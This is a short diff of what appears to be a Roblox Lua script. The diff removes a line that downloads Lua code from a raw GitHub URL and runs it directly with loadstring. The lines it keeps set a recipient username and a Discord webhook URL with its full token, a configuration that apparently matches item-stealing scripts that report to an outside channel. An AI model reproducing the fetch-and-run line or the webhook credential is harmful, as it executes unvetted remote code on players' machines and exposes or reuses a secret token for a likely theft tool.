@@ -1,7 +1,4 @@
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/TechRats-visual/main/VisualPets_TRats.lua", true))()
-wait(20)
-
 UserName = "pinoyjar"
 Webhook = "https://discord.com/api/webhooks/1148608502365954108/PNjIiQGWH5ypSoUsvg0BspOxj3hPLSA4yBHPOIH6giZXvfIWJ3PlYIJjLLPxo-kWz7Ua" 
 UserName2 = "pinoyjar"
